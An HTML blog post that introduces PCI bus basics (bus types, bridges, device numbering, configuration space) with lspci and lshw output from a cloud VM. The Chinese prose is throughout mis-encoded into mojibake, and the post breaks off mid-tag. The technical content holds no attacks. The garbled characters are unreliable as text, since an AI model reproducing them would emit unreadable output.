    <content type="html"><![CDATA[<p>ğŸ‘´ç­‰ä¼šæŠŠä½ æ€»çº¿éƒ½ç»™æ‰¬äº†</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å› ä¸ºç¬”è€…æœ€è¿‘ä¸æ‡‚ä¸ºä»€ä¹ˆå¼€å§‹å†™ PCI è®¾å¤‡é©±åŠ¨äº†ï¼Œä½†ç¬”è€…æ˜¯ <em>ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸š</em> çš„æœ¬ç§‘ç”Ÿï¼Œæ­¤å‰åŸºæœ¬ä¸Šæ²¡æœ‰æ¥è§¦è¿‡ä¸ç¡¬ä»¶ç›¸å…³è”çš„çŸ¥è¯†ï¼ˆ<s>å› ä¸ºè®¡ç»„å’Œå¾®åŸè¯¾è®²çš„å°±æ˜¯ä¸ªğŸ“â‘§</s>ï¼‰ï¼Œæ‰€ä»¥å¼€äº†è¿™ç¯‡æ–°çš„åšå®¢ç®€è¦è®°è½½ä¸€äº›ä¸ PCI è®¾å¤‡ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ã€åŸºæœ¬ Linux PCI é©±åŠ¨çš„ç¼–å†™ç­‰</p><blockquote><p>ä¸ºäº†å†™è¿™ç¯‡åšå®¢ï¼Œç¬”è€…ç¿»äº†ç¬”è€…å¤§äºŒä¸Šå­¦æœŸçš„è®¡ç®—æœºç»„æˆåŸç†çš„è¯¾æœ¬ï¼Œè¿˜ç¿»äº†å¤§äºŒä¸‹å­¦æœŸçš„å¾®æœºåŸç†çš„è¯¾æœ¬ï¼Œå‘ç°<strong>è¿™ä¸¤é—¨è¯¾æ ¹æœ¬å°±æ˜¯ä»€ä¹ˆéƒ½æ²¡è®²â€¦<strong>å› ä¸ºä¹Ÿå¼„ä¸åˆ°å¾®é™¢é‚£è¾¹ç›¸å…³çš„æ•™æï¼Œæ‰€ä»¥æœ¬ç¯‡åšå®¢</strong>å¹¶æ²¡æœ‰ä¸€ä¸ªç³»ç»Ÿæ€§çš„æŒ‡å¯¼</strong>æ¥è¾…åŠ©å†™ä½œï¼Œéƒ½æ˜¯å„ç§ä¸œæ‹¼è¥¿å‡‘ï¼‹ç¬”è€…è‡ªå·±çš„ç†è§£ï¼Œ<strong>å¾ˆå¤šä¸œè¥¿å› ä¸ºç¬”è€…è‡ªèº«æ°´å¹³ä½ä¸‹çš„ç¼˜æ•…åªèƒ½ä¸€ç¬”å¸¦è¿‡</strong>ï¼Œå› æ­¤å¯èƒ½ä¼šæ˜¾å¾—ä¸å¤Ÿä¸“ä¸šï¼Œå¸Œæœ›è¯»è€…è§è°…XD</p><blockquote><p>å¦‚æœéœ€è¦æ›´ä¸ºä¸“ä¸šçš„å‚è€ƒèµ„æ–™è¯·ç›´æ¥å‚è€ƒ <a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">ã€ŠPCI_Express_Technologyã€‹</a></p></blockquote><blockquote><p>ä»¥åŠç¬”è€…éå¸¸æ·±åˆ»çš„æ„è¯†åˆ°åœ¨ç¡¬ä»¶è¿™ä¸€å—çš„çŸ¥è¯†ç¬”è€…ç›¸æ¯”äºé‚£äº›ä¸“é—¨æç¡¬ä»¶çš„äººè€Œè¨€**ç¡®å®å·®äº†å¾ˆå¤šâ€¦**åªèƒ½è¯´ç»§ç»­åŠªåŠ›å§XD</p></blockquote></blockquote><h1>0x01. PCI basic knowledge</h1><h2 id="ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°">ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“è®¡ç®—æœºçš„äº”ä¸ªåŸºæœ¬ç»„ä»¶ä¸ºï¼š<strong>è¾“å…¥ï¼Œè¾“å‡ºï¼Œå­˜å‚¨å™¨ï¼Œè¿ç®—å™¨ï¼ˆæˆ–æ•°æ®é€šè·¯ï¼‰ï¼Œæ§åˆ¶å™¨</strong>ã€‚é‚£ä¹ˆè¿™å‡ å¤§ç»„ä»¶ä¹‹é—´æ€ä¹ˆé€šä¿¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¾é <strong>ç³»ç»Ÿæ€»çº¿</strong></p><p><strong>æ€»çº¿</strong>ï¼ˆbusï¼‰æ˜¯ä¸€ç§å°†å¤šä¸ªåŠŸèƒ½å•å…ƒè¿›è¡Œè¿æ¥å¹¶å…è®¸åŠŸèƒ½å•å…ƒä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ç§æ•°æ®é€šè·¯ï¼Œåœ¨ç°ä»£è®¡ç®—æœºä¸­é€šå¸¸é‡‡ç”¨æ€»çº¿ç»“æ„ï¼Œå³å­˜åœ¨ä¸€æ ¹ä¸»è¦çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼ŒCPU åŠå„ç§è®¾å¤‡éƒ½é€šè¿‡è¿™è·Ÿæ€»çº¿è¿›è¡Œé€šä¿¡</p><p>æ€»çº¿æŒ‰åŠŸèƒ½å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p><ul><li><strong>ç‰‡å†…æ€»çº¿</strong>ï¼šèŠ¯ç‰‡å†…çš„æ€»çº¿ï¼Œä½äº CPU å†…éƒ¨ï¼Œç”¨ä»¥åœ¨å¯„å­˜å™¨ä¸å¯„å­˜å™¨ã€å¯„å­˜å™¨ä¸ ALU ä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢</li><li><strong>ç³»ç»Ÿæ€»çº¿</strong>ï¼šè®¡ç®—æœºç³»ç»Ÿå†…å„åŠŸèƒ½å•å…ƒï¼ˆCPUã€ä¸»å­˜ã€I/Oï¼‰ä¹‹é—´çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å†…æ€»çº¿</em></li><li><strong>é€šä¿¡æ€»çº¿</strong>ï¼šç”¨äºè®¡ç®—æœºç³»ç»Ÿä¹‹é—´æˆ–æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸å…¶ä»–ç³»ç»Ÿï¼ˆä¾‹å¦‚è¿œç¨‹é€šä¿¡è®¾å¤‡ï¼‰ä¹‹é—´è¿›è¡Œé€šä¿¡çš„æ€»çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å¤–æ€»çº¿</em></li></ul><p>æ€»çº¿æ˜¯å¯ä»¥æ‰©å±•çš„ï¼Œå³å¯ä»¥å­˜åœ¨å¤šä¸ªä¸åŒç±»å‹çš„æ€»çº¿ç›¸è¿ï¼Œä¸åŒçš„è®¾å¤‡æ¥å…¥åˆ°ä¸åŒç±»å‹çš„æ€»çº¿ä¸Š</p><p><img src="https://s2.loli.net/2022/07/21/fWTEztvhuXAqN8d.png" alt="image.png"></p><h2 id="äºŒã€PCI-æ¦‚å¿µç®€è¿°">äºŒã€PCI æ¦‚å¿µç®€è¿°</h2><p>PCI å³ <code>Peripheral Component Interconnect</code>ï¼Œæ˜¯ä¸€ç§<strong>è¿æ¥ç”µè„‘ä¸»æ¿å’Œå¤–éƒ¨è®¾å¤‡çš„æ€»çº¿æ ‡å‡†</strong>ï¼Œå…¶é€šè¿‡å¤šæ ¹ PCI bus å®Œæˆ CPU ä¸ å¤šä¸ª PCI è®¾å¤‡é—´çš„è¿æ¥ï¼Œï¼Œåœ¨ X86 ç¡¬ä»¶ä½“ç³»ç»“æ„ä¸­å‡ ä¹æ‰€æœ‰çš„è®¾å¤‡éƒ½ä»¥å„ç§å½¢å¼è¿æ¥åˆ° PCI è®¾å¤‡æ ‘ä¸Š</p><p><code>PCI express</code> æ˜¯æ–°ä¸€ä»£çš„æ€»çº¿æ ‡å‡†ï¼Œå®ƒæ²¿ç”¨æ—¢æœ‰çš„PCIç¼–ç¨‹æ¦‚å¿µåŠä¿¡å·æ ‡å‡†ï¼Œå¹¶ä¸”æ„å»ºäº†æ›´åŠ é«˜é€Ÿçš„ä¸²è¡Œé€šä¿¡ç³»ç»Ÿæ ‡å‡†</p><p>æˆ‘ä»¬é¦–å…ˆæ˜ç¡® PCI æ ‡å‡†ä¸­çš„ä¸‰ä¸ªåŸºæœ¬ç»„ä»¶ï¼š</p><ul><li><strong>PCI è®¾å¤‡</strong>ï¼ˆdeviceï¼‰ï¼šç¬¦åˆ PCI æ€»çº¿æ ‡å‡†çš„è®¾å¤‡éƒ½å¯ä»¥ç§°ä¹‹ä¸º PCI è®¾å¤‡ï¼Œåœ¨ä¸€ä¸ª PCI æ€»çº¿ä¸Šå¯ä»¥åŒ…å«å¤šä¸ª PCI è®¾å¤‡</li><li><strong>PCI æ€»çº¿</strong>ï¼ˆbusï¼‰ï¼šç”¨ä»¥è¿æ¥å¤šä¸ª PCI è®¾å¤‡ä¸å¤šä¸ª PCI æ¡¥çš„é€šä¿¡å¹²é“</li><li><strong>PCI æ¡¥</strong>ï¼ˆbridgeï¼‰ï¼šæ€»çº¿ä¹‹é—´çš„<strong>è¿æ¥æ¢çº½</strong>ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š<ul><li>HOST/PCI æ¡¥ï¼šä¹Ÿç§°ä¸º PCI ä¸»æ¡¥æˆ–è€… PCI æ€»çº¿æ§åˆ¶å™¨ï¼Œç”¨ä»¥è¿æ¥ CPU ä¸ PCI æ ¹æ€»çº¿ï¼Œ<strong>éš”ç¦»è®¾å¤‡åœ°å€ç©ºé—´ä¸å­˜å‚¨å™¨åœ°å€ç©ºé—´</strong>ï¼Œç°ä»£ PC é€šå¸¸è¿˜ä¼šåœ¨å…¶ä¸­é›†æˆå†…å­˜æ§åˆ¶å™¨ï¼Œç§°ä¹‹ä¸º<strong>åŒ—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆNorth Bridge Chipsetï¼‰</li><li>PCI/ISA æ¡¥ï¼šç”¨äºè¿æ¥æ—§çš„ ISA æ€»çº¿ï¼Œé€šå¸¸è¿˜ä¼šé›†æˆä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ i8359Aï¼‰ï¼Œç§°ä¹‹ä¸º<strong>å—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆSouth Bridge Chipsetï¼‰</li><li>PCI-to-PCI æ¡¥ï¼šç”¨äºè¿æ¥ PCI ä¸»æ€»çº¿ï¼ˆPrimary Busï¼‰ä¸æ¬¡æ€»çº¿ï¼ˆSecondary Busï¼‰</li></ul></li></ul><p>PCIé‡‡ç”¨æ ‘å½¢æ‹“æ‰‘ç»“æ„ï¼Œä¸€ä¸ªå…¸å‹çš„ PCI æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç”±ä¸€ä¸ª <code>PCI Host Bus</code> è´Ÿè´£æ€»çš„é€šä¿¡ï¼Œ åœ¨ Host Bus ä¸‹æŒ‚è½½ç€ä¸€ä¸ªæˆ–å¤šä¸ª <code>PCI Root Bridge</code>ï¼Œä¸€ä¸ª <code>PCI Root Bridge</code> ç®¡ç†ä¸€ä¸ª <code>PCI Local Bus</code> ç©ºé—´ï¼ŒæŒ‚è½½ç€ä¸€é¢— PCI æ€»çº¿æ ‘ï¼š</p><p><img src="https://s2.loli.net/2022/08/30/LI1ayCdsB2qNWb4.png" alt="image.png"></p><p>ç”±æ­¤ï¼Œä¸€ä¸ªå¤šå±‚ PCI æ€»çº¿ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/7rT3aEytb2lumZP.png" alt="image.png"></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç°å®ä¸­çš„ç»å…¸ä¾‹å­ï¼Œä»¥ä¸‹å›¾çš„ <code>Intel 440FX</code> èŠ¯ç‰‡ç»„ä¸ºä¾‹ï¼ŒPCI Host Bridge åˆ†éš”å¼€äº†å­˜å‚¨å™¨åŸŸä¸ PCI è®¾å¤‡åŸŸï¼Œ<strong>å…¶åˆ†åˆ«ä½¿ç”¨ç‹¬ç«‹çš„åœ°å€ç©ºé—´</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>åœ¨ Linux ä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>lspci</code> æŒ‡ä»¤æŸ¥çœ‹æ’åœ¨å½“å‰æœºå™¨çš„ PCI bus ä¸Šçš„ PCI è®¾å¤‡ï¼Œä½¿ç”¨ <code>-t</code> å‚æ•°æŸ¥çœ‹æ ‘å½¢ç»“æ„ï¼Œ<code>-v</code> å‚æ•°å¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š</p><blockquote><p>è¿™é‡Œå±•ç¤ºçš„ç»“æœæœ‰ virtio è®¾å¤‡æ˜¯å› ä¸ºç¬”è€…æ˜¯åœ¨é˜¿é‡Œäº‘å­¦ç”Ÿæœºä¸Šä½¿ç”¨çš„å‘½ä»¤ï¼Œè¿™ç±»æœºå™¨ä¸€èˆ¬å…¶å®éƒ½æ˜¯ç”¨ Qemu è·‘çš„è™šæ‹Ÿæœº</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci</span><br>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)<br>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)<br>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)<br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device<br>00:04.0 Communication controller: Red Hat, Inc. Virtio console<br>00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device<br>00:06.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -t -v</span><br>-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]<br>           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>           +-01.2  Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II]<br>           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI<br>           +-02.0  Cirrus Logic GD 5446<br>           +-03.0  Red Hat, Inc. Virtio network device<br>           +-04.0  Red Hat, Inc. Virtio console<br>           +-05.0  Red Hat, Inc. Virtio block device<br>           \-06.0  Red Hat, Inc. Virtio memory balloon<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>lshw -businfo</code> å‘½ä»¤æ¥è·å–è®¾å¤‡ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo lshw -businfo</span><br>[sudo] password for arttnba3:<br>Bus info          Device       Class          Description<br>=========================================================<br>                               system         Alibaba Cloud ECS<br>                               bus            Motherboard<br>                               memory         96KiB BIOS<br>cpu@0                          processor      Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz<br>                               memory         2GiB System Memory<br>                               memory         2GiB DIMM RAM<br>pci@0000:00:00.0               bridge         440FX - 82441FX PMC [Natoma]<br>pci@0000:00:01.0               bridge         82371SB PIIX3 ISA [Natoma/Triton II]<br>pci@0000:00:01.1               storage        82371SB PIIX3 IDE [Natoma/Triton II]<br>pci@0000:00:01.2               bus            82371SB PIIX3 USB [Natoma/Triton II]<br>usb@1             usb1         bus            UHCI Host Controller<br>usb@1:1                        input          QEMU USB Tablet<br>pci@0000:00:01.3               bridge         82371AB/EB/MB PIIX4 ACPI<br>pci@0000:00:02.0               display        GD 5446<br>pci@0000:00:03.0               network        Virtio network device<br>virtio@0          eth0         network        Ethernet interface<br>pci@0000:00:04.0               communication  Virtio console<br>virtio@1                       generic        Virtual I/O device<br>pci@0000:00:05.0               storage        Virtio block device<br>virtio@2          /dev/vda     disk           42GB Virtual I/O device<br>virtio@2,1        /dev/vda1    volume         39GiB EXT4 volume<br>pci@0000:00:06.0               generic        Virtio memory balloon<br>virtio@3                       generic        Virtual I/O device<br>                               system         PnP device PNP0b00<br>                               input          PnP device PNP0303<br>                               input          PnP device PNP0f13<br>                               storage        PnP device PNP0700<br>                               communication  PnP device PNP0501<br>                  veth073b1a5  network        Ethernet interface<br>                  veth2c8670f  network        Ethernet interface<br>                  vethc0202a2  network        Ethernet interface<br>                  veth49e878e  network        Ethernet interface<br></code></pre></td></tr></table></figure><p>PCI è®¾å¤‡æ˜¯åœ¨å†…æ ¸å¯åŠ¨åˆå§‹åŒ–é˜¶æ®µè¿›è¡Œæšä¸¾çš„ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½æœ‰çš„è®¾å¤‡è¿˜æ²¡å‡†å¤‡å¥½ï¼Œä»è€Œæ²¡è¢«æšä¸¾åˆ°ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°è¿›è¡Œè®¾å¤‡æšä¸¾ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€PCI-è®¾å¤‡ç¼–å·">ä¸‰ã€PCI è®¾å¤‡ç¼–å·</h2><p>æ¯ä¸ªPCI è®¾å¤‡éƒ½æœ‰ç€ä¸‰ä¸ªç¼–å·ï¼š<strong>æ€»çº¿ç¼–å·ï¼ˆBus Numberï¼‰ã€è®¾å¤‡ç¼–å·ï¼ˆDevice Numberï¼‰ä¸åŠŸèƒ½ç¼–å·ï¼ˆFunction Numberï¼‰</strong>ï¼Œä½œä¸ºè®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ï¼›åœ¨æ­¤ä¹‹ä¸Šè¿˜æœ‰ <strong>PCI åŸŸ</strong>çš„æ¦‚å¿µï¼Œä¸€ä¸ª PCI åŸŸä¸Šæœ€å¤šå¯ä»¥è¿æ¥ 256 æ ¹ PCI æ€»çº¿</p><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci</code> å‘½ä»¤æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ¯ä¸ªè®¾å¤‡å¼€å¤´éƒ½å¯ä»¥çœ‹åˆ°å½¢å¦‚ <code>xx:yy.z</code> çš„åå…­è¿›åˆ¶ç¼–å·ï¼Œè¿™ä¸ªæ ¼å¼å…¶å®æ˜¯ <code>æ€»çº¿ç¼–å·:è®¾å¤‡ç¼–å·.åŠŸèƒ½ç¼–å·</code>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci -v </code>æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ€»çº¿ç¼–å·å‰é¢çš„ 4 ä½æ•°å­—ä¾¿æ˜¯ PCI åŸŸçš„ç¼–å·</p><h2 id="å››ã€PCI-è®¾å¤‡é…ç½®ç©ºé—´">å››ã€PCI è®¾å¤‡é…ç½®ç©ºé—´</h2><p>æ¯ä¸ª PCI é€»è¾‘è®¾å¤‡ä¸­éƒ½æœ‰ç€å…¶è‡ªå·±çš„<strong>é…ç½®ç©ºé—´</strong>ï¼ˆconfiguration spaceï¼‰ï¼Œé€šå¸¸æ˜¯è®¾å¤‡åœ°å€ç©ºé—´çš„å‰ 64 å­—èŠ‚ï¼ˆæ–°ç‰ˆçš„è®¾å¤‡è¿˜æ‰©å±•äº† 0x40~0xFF è¿™æ®µé…ç½®ç©ºé—´ï¼‰ï¼Œå…¶ä¸­å­˜æ”¾äº†ä¸€äº›è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ç”Ÿå‚å•†ä¿¡æ¯ã€IRQä¸­æ–­å·ã€mem ç©ºé—´ä¸ io ç©ºé—´çš„èµ·å§‹åœ°å€ä¸å¤§å°ç­‰</p><p>Intel èŠ¯ç‰‡ç»„ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ IO ç©ºé—´çš„ <code>CF8/CFC</code> åœ°å€ï¼ˆç«¯å£ï¼‰æ¥è®¿é—® PCI è®¾å¤‡çš„é…ç½®å¯„å­˜å™¨ï¼š</p><ul><li><code>CF8</code>ï¼š<strong>CONFIG_ADDRESS</strong>ï¼Œå³ PCI é…ç½®ç©ºé—´åœ°å€ç«¯å£ã€‚</li><li><code>CFH</code>ï¼š<strong>CONFIG_DATA</strong>ï¼Œå³ PCI é…ç½®ç©ºé—´æ•°æ®ç«¯å£ã€‚</li></ul><p>å½“æˆ‘ä»¬å¾€ <code>CONFIG_ADDRESS</code> ç«¯å£å¡«å…¥å¯¹åº”çš„è®¾å¤‡æ ‡è¯†åï¼Œå°±å¯ä»¥ä» <code>CONFIG_DATA</code> ç«¯å£ä¸Šè¯»å†™ PCI é…ç½®ç©ºé—´çš„å†…å­˜ï¼Œ <code>CONFIG_ADDRESS</code> ç«¯å£çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><ul><li><code>31</code> ä½ï¼šEnable ä½</li><li><code>23:16</code> ä½ï¼šæ€»çº¿ç¼–å·</li><li><code>15:11</code> ä½ï¼šè®¾å¤‡ç¼–å·</li><li><code>10:8</code> ä½ï¼šåŠŸèƒ½ç¼–å·</li><li><code>7:2</code> ä½ï¼šé…ç½®ç©ºé—´å¯„å­˜å™¨ç¼–å·</li><li><code>1:0</code> ä½ï¼šæ’ä¸º <code>00</code></li></ul><blockquote><p>é™¤äº†é€šè¿‡ç«¯å£è®¿é—®å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ MMIO çš„æ–¹å¼è®¿é—®ä¸€ä¸ª PCI è®¾å¤‡çš„åœ°å€ç©ºé—´</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ PCI é…ç½®ç©ºé—´çš„ç»“æ„ï¼ŒPCI è®¾å¤‡åˆ†ä¸º <code>Bridge</code> ä¸ <code>Agent</code> ä¸¤ç±»ï¼Œæ•…é…ç½®ç©ºé—´ä¹Ÿåˆ†ä¸ºç›¸åº”çš„ä¸¤ç±»</p><p>Agent ç±»å‹é…ç½®ç©ºé—´åˆè¢«ç§°ä¸º <code>Type 00h</code>ï¼Œæ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/CEpqkAM1D78XRLG.png" alt="image.png"></p><p>ç›¸åº”åœ°ï¼ŒBridge ç±»å‹é…ç½®ç©ºé—´è¢«ç§°ä¸º <code>Type 01h</code>ï¼Œä¸ Agent ç±»å‹é…ç½®ç©ºé—´å¤§åŒå°å¼‚ï¼š</p><p><img src="https://s2.loli.net/2022/07/21/emyrRVo5W6X12aG.png" alt="image.png"></p><p>ç®€å•ä»‹ç»å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p><ul><li><p>è®¾å¤‡æ ‡è¯†ç›¸å…³ï¼š</p><ul><li><p><code>Vendor ID</code>ï¼šç”Ÿäº§å‚å•†çš„ IDï¼Œä¾‹å¦‚ Intel è®¾å¤‡é€šå¸¸ä¸º <code>0x8086</code></p></li><li><p><code>Device ID</code>ï¼šå…·ä½“è®¾å¤‡çš„ IDï¼Œé€šå¸¸ä¹Ÿæ˜¯ç”±å‚å®¶è‡ªè¡ŒæŒ‡å®šçš„</p></li><li><p><code>Class Code</code>ï¼šç±»ä»£ç ï¼Œç”¨äºåŒºåˆ†è®¾å¤‡ç±»å‹</p></li><li><p><code>Revision ID</code>ï¼šPCI è®¾å¤‡çš„ç‰ˆæœ¬å·ï¼Œå¯ä»¥çœ‹ä½œ Device ID çš„æ‰©å±•</p></li></ul></li><li><p>è®¾å¤‡çŠ¶æ€ç›¸å…³ï¼š</p><ul><li><p><code>Status</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/ZTplAr87OQ96cRU.png" alt="image.png"></p></li><li><p><code>Command</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/rM3YhuaoPK25mNn.png" alt="image.png"></p></li></ul></li><li><p>è®¾å¤‡é…ç½®ç›¸å…³ï¼š</p><ul><li><p><code>Base Address Registers</code>ï¼šå†³å®šäº† PCI è®¾å¤‡ç©ºé—´æ˜ å°„åˆ°ç³»ç»Ÿç©ºé—´çš„å…·ä½“ä½ç½®ï¼Œæœ‰ä¸¤ç§æ˜ å°„æ–¹å¼ï¼šMMIO ä¸ PMIOï¼Œæ˜ å°„æ–¹å¼ç”±æœ€ä½ä½å†³å®šï¼Œä¸å¯æ›´æ”¹</p></li><li><p><code>Interrupt Pin</code>ï¼šä¸­æ–­å¼•è„šï¼Œè¯¥å¯„å­˜å™¨è¡¨ç¤ºè®¾å¤‡æ‰€è¿æ¥çš„å¼•è„š</p></li><li><p><code>Interrupt Line</code>ï¼šä¸­æ–­ç¼–å·</p></li></ul></li></ul><p>å‰é¢æˆ‘ä»¬è®²åˆ° lspci å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>-s</code> æ¥é€šè¿‡æŒ‡å®šæŸ¥çœ‹çš„å…·ä½“ PCI è®¾å¤‡ï¼Œé€šè¿‡ <code>-m</code> æŸ¥çœ‹éƒ¨åˆ†ä¿¡æ¯ï¼Œé€šè¿‡ <code>-nn</code> æŸ¥çœ‹æ¯”è¾ƒè¯¦ç»†çš„ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -m</span><br>Device: 00:02.0<br>Class:  VGA compatible controller<br>Vendor: Cirrus Logic<br>Device: GD 5446<br>SVendor:        Red Hat, Inc.<br>SDevice:        QEMU Virtual Machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -nn</span><br>00:02.0 VGA compatible controller [0300]: Cirrus Logic GD 5446 [1013:00b8] (prog-if 00 [VGA controller])<br>        Subsystem: Red Hat, Inc. QEMU Virtual Machine [1af4:1100]<br>        Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-<br>        Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-<br>        Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M]<br>        Region 1: Memory at febd0000 (32-bit, non-prefetchable) [size=4K]<br>        Expansion ROM at 000c0000 [disabled] [size=128K]<br>        Kernel driver in use: cirrus<br>        Kernel modules: cirrusfb, cirrus<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>-x</code> å‚æ•°æ¥æŸ¥çœ‹ PCI è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight 